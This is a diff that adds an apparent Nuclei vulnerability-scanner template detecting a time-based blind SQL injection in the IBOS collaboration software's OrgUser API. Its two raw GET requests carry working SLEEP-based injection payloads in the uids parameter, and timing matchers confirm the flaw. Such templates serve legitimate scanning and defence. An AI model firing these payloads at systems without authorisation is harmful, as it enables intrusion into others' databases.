@@ -1,0 +1,37 @@
+id: ibos-ecms-orguser-sqli
+info:
+  name: "IBOS 企业协作管理软件 OrgUser 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: IBOS
+  description: |
+    Detects a SQL injection vulnerability in the IBOS Enterprise Collaboration Management Software OrgUser API endpoint.
+
+http:
+  - raw:
+      - |
+        GET /?r=main/api/orguser&uids=u_1%27)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)%20AND%20(%27222%27%3D%27222 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+      - |
+        GET /?r=main/api/orguser&uids=u_1%27)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(8)))a)%20AND%20(%27222%27%3D%27222 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"isSuccess":true'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
